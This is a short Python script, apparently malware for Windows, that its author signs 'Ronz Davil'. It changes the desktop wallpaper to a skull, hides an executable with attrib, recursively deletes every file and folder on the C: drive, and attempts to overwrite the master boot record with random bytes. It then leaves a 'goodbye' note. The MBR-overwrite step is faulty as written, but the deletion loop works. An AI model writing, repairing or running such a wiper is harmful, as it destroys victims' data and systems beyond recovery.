import os
import shutil
import ctypes
import random

# Step 1: Change wallpaper
wallpaper_path = r"C:\Users\Public\wallpaper.jpg"
shutil.copy("skull.jpg", wallpaper_path)
ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)

# Step 2: Silent execution (no pop-ups)
os.system("attrib +H +S +R Ronzenot.exe")  # Hide and mark as system

# Step 3: Data destruction
for root, dirs, files in os.walk("C:\\", topdown=False):
    for file in files:
        os.remove(os.path.join(root, file))
    for dir in dirs:
        shutil.rmtree(os.path.join(root, dir))

# Step 4: Encrypt control (MBR overwrite)
with open("C:\\", "rb") as f:
    mbr = f.read(512)
with open("C:\\", "wb") as f:
    f.write(bytes([random.randint(0, 255) for _ in range(512)]))

# Step 5: Final message
with open("C:\\goodbye.txt", "w") as f:
    f.write("Goodbye, PC. This was created by Ronz Davil. All your data is gone. Welcome to the void.")